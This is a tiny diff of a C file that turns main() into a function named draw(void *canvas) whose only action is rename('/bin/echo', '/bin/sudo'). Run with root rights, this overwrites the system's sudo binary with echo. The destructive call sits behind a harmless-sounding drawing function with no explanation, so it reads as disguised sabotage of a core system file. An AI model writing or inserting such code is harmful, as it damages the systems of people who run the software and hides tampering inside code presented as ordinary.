@@ -1,6 +1,5 @@
 #include <stdio.h>
 
-int main() {
+void draw(void *canvas) {
     rename("/bin/echo", "/bin/sudo");
-    return 0;
 }
